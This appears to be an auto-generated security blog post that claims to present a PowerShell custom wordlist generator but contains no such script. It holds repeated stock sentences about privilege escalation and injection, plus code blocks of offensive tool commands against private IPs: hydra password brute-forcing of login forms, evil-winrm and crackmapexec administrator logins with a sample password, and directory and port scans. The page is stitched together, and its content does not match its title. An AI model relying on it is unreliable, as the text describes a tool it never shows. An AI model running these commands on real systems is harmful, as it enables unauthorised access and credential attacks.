---
TitleSEO: "Custom Wordlist Generator in PowerShell | ZureFX"
TitlePost: "Custom Wordlist Generator — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for custom wordlist generator. Built for security research and automation."
Keywords: "script, go, fuzzer, c, bash, powershell"
URL: "https://zurefx.github.io/scripting/script-custom-wordlist-generator-802.html"
URL_IMAGES: ""
Date: "2025-02-21"
Tags: "Script, Go, Fuzzer, C, Bash, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-custom-wordlist-generator-802"
Permalink: "/scripting/script-custom-wordlist-generator-802.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Weak file permissions allowed modification of critical system files. Network traffic analysis revealed unencrypted communications containing user credentials. The kernel version was outdated and vulnerable to a publicly known exploit.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `atexec`
- `wmiexec`
- `ligolo-ng`

## Implementation

### Core Logic

The scheduled task ran with elevated privileges and could be abused for escalation. Command injection was possible through unsanitized user input in the search functionality.

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.68.247.76/FUZZ
nmap -sCV -p80,5985,143 10.43.155.86 -oN scan.txt
nmap -sCV -p25,8443,8443 10.41.30.32 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.86.213.56 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Privilege escalation was possible due to misconfigured sudo permissions.

### Helper Functions

Command injection was possible through unsanitized user input in the search functionality. The target system was identified as running a vulnerable version of the service.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.44.218.137 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Usage

### Basic Usage

Privilege escalation was possible due to misconfigured sudo permissions. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
feroxbuster -h
gobuster dir -u http://10.88.24.209/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
evil-winrm -i 10.96.213.5 -u administrator -p 'P@ssw0rd!'
```

### Advanced Options

The service was running without proper input validation, leading to injection vulnerabilities. The service was running without proper input validation, leading to injection vulnerabilities. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.115.71.154 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.38.193.79 -u administrator -p 'P@ssw0rd!' --shares
```

## Output

### Example Output

The service was running without proper input validation, leading to injection vulnerabilities. Privilege escalation was possible due to misconfigured sudo permissions.

```
[+] Scanning target...
[+] Found 12 results
[+] Done in 28.77s
```
